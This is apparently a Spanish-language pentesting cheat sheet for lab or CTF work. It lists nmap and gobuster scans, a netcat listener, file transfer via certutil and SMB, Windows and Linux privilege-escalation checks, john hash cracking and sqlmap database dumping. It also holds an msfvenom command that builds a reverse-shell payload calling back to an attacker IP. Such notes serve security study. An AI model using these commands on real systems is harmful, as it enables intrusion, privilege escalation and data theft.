## Identificar puertos abeirtos
```sh
nmap -sS -p- --open -min-rate 5000 -n -vvv -Pn -oG allPorts
```
-oG se guarda en formato grepeable para poder extraer los puertos con extractports 
-sS escaneo sigiloso 
-p- escanea todos los puertos --open 
-min-rate 5000 Intenta enviar al menos 5000 paquetes por segundo 
-n No realiza resolución DNS // -vvv Muestra resultados muy detallados 
-Pn Desactiva la detección de hosts

## Identificar versiones de los puertos abiertos
```sh
nmap -sV -sC -p<puertos separados por ,> -n -v -Pn -oA scan
```
-sV deteccion de versiones 
-sC ejecuta scripts por defecto 
-n No realiza resolución DNS 
-v muestra resultados detallados 
-Pn Desactiva la detección de hosts

## Scripts con nmap
```sh
nmap --script "vuln and safe" -p
```
## Gobuster
```sh
gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt -x .txt,.php -t 100 | grep -v "301"
```
dir para directorio
-u para la url
-w para pasarle el diccionario
-x para agregar .txt a todos los datos del diccionario
-t para los hilos
| grep -v "301" para no mostrar los status

## Colocarse en escucha
```sh
nc -lvnp <puerto>
```

## Abrir un servidor para transferir archivos
```sh
python3 -m http.server <puerto>
```

## Escalacion de privilegios en Windows (Windows-Exploit-Suggester)
Revissar version   systeminfo
En el windows se coloca el comando systeminfo y ese output se guarda en linux en un archivo llamado systeminfo.txt
```sh
python2 windows-exploit-suggester -u //descarga el archivo
python2 windows-exploit-suggester -d <archivo descargado> -i systeminfo.txt
```

privilegios whoami /priv
SeImpersonatePrivilege        Impersonate a client after authentication Enabled >>> juicipotato privilege escalation (churrasco.exe para sistemas antiguos) (https://binaryregion.wordpress.com/2021/06/14/privilege-escalation-windows-juicypotato-exe/)
o printspoofer
winpeas

## Transferir archivos de linux a windows
En linux abrir un servidor
Windows:
```sh
certutil -urlcache -f http://<ip que esta enviando el archivo>:<puerto>/archivo.extension archivo.extension
```

linux:
```sh
impacket-smbserver recurso $(pwd) -smb2support
```
windows:
```sh
copy \\<ip atacante>\recurso\archivo.extension archivo.extension
```

## Transferir archivos de linux a linux
Abrir servidor
recibir:
```sh
wget http://<ip que esta enviando el archivo>:<puerto>/archivo.etension -O archivo.extension
```

## Escalar privilegios en linux
Permisos sudo: 
```sh
sudo -l
```
Permisos suid: 
```sh
find / -type f -perm -4000 -ls 2>/dev/null
```
listar tareas predefinidas : 
```sh
cat /etc/crontab
```
Linux versiones anteriores 
```sh
searchsploit dirty cow
```

## Pasar de hexadecimal a normal
Linux versiones anteriores 
```sh
echo "486f6c61206d756e646f" | xxd -r -p
```

## Pasar de base 64 a normal
```sh
echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d
```

## Decifrar hash
Saber el tipo de hash
```sh
hashid hash
```
```sh
john --wordlist=/usr/share/wordlists/rockyou.txt hash -format=Raw-SHA256
```

## Reverseshell msfvenom
```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.32 LPORT=443 -f aspx -o shell2.aspx
```

## mejorar bash
```sh
script /dev/null -c bash
```
crtl + z
```sh
stty raw -echo; fg
```
```sh
reset xterm
```
```sh
export TERM=xterm
```
En la terminal del atacante para saber el tamaño de nano
```sh
stty size
```
En la terminal de la victima para ajustar el tamaño de nano
```sh
stty rows <rows> columns <columns>
```

##  Listar puertos ocultos
```sh
netstat -na -p tcp
```

## Sql map
Con burpsuite ver la peticion y descargar el archivo como request.txt
```sh
sqlmap -r request.txt --dbms=mysql --dump
```

## Listar smb
Ver recursos compartidos
```sh
smbclient -L ip
```
```sh
smbclient  //ip/recurso
```
Descargar archivo
```sh
get archivo
```
Subir archivo 
```sh
put archiv
```






